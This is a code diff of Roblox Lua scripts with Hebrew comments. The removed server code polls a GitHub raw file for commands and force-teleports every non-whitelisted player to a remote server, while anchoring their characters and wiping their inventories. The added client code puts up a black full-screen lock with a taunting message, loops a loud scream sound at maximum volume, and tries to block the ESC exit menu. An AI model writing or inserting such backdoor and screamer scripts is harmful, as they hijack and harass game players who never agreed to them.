@@ -1,47 +1,36 @@
-local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
-local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LockEvent = ReplicatedStorage:WaitForChild("LockEvent")
+local player = game.Players.LocalPlayer
 
-local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"
-local whitelisted = {["noamdb15"] = true, ["dylanzyl123"] = true}
+-- כאן שמתי לך סאונד של צרחה חזקה מאוד (רעש חזק) שעובד ברובלוקס
+local SOUND_ID = "rbxassetid://1316496417" 
 
-Players.PlayerAdded:Connect(function(player)
-	if whitelisted[player.Name] then return end
+LockEvent.OnClientEvent:Connect(function()
+	-- יצירת מסך
+	local sg = Instance.new("ScreenGui", player.PlayerGui)
+	sg.IgnoreGuiInset = true
+	sg.DisplayOrder = 9999999
 	
-	player.CharacterAdded:Connect(function(char)
-		task.wait(0.5)
-		-- פקודה למסך וסאונד
-		LockEvent:FireClient(player)
-		
-		-- נעילה ומחיקת חפצים בלופ
-		task.spawn(function()
-			while player.Parent do
-				if char:FindFirstChild("HumanoidRootPart") then
-					char.HumanoidRootPart.Anchored = true
-					player.Backpack:ClearAllChildren()
-				end
-				task.wait(0.1)
-			end
-		end)
-	end)
-end)
+	local frame = Instance.new("Frame", sg)
+	frame.Size = UDim2.new(1, 0, 1, 0)
+	frame.BackgroundColor3 = Color3.new(0, 0, 0)
+	frame.Active = true
+	
+	local label = Instance.new("TextLabel", frame)
+	label.Size = UDim2.new(0.8, 0, 0.4, 0)
+	label.Position = UDim2.new(0.1, 0, 0.3, 0)
+	label.BackgroundTransparency = 1
+	label.TextColor3 = Color3.new(1, 0, 0)
+	label.TextScaled = true
+	label.Text = "הלך לך הבייס חבר יקר"
 
--- לופ שיגור
-task.spawn(function()
-	while task.wait(0.5) do
-		local s, r = pcall(function() return HttpService:GetAsync(rawUrl.."?t="..tick()) end)
-		if s and r then
-			local lines = {}
-			for line in r:gmatch("[^\r\n]+") do table.insert(lines, line) end
-			if lines[2] and lines[2] ~= "" then
-				for _, p in pairs(Players:GetPlayers()) do
-					if not whitelisted[p.Name] then
-						pcall(function() TeleportService:TeleportToPlaceInstance(tonumber(lines[1]), lines[2], p) end)
-					end
-				end
-			end
-		end
-	end
+	-- הפעלת סאונד
+	local snd = Instance.new("Sound", game.Workspace)
+	snd.SoundId = SOUND_ID
+	snd.Volume = 10
+	snd.Looped = true
+	snd:Play()
+	
+	-- חסימת תפריט יציאה (ESC) - טריק שמקשה על הלחיצה
+	game:GetService("GuiService").SelectedObject = label
 end)
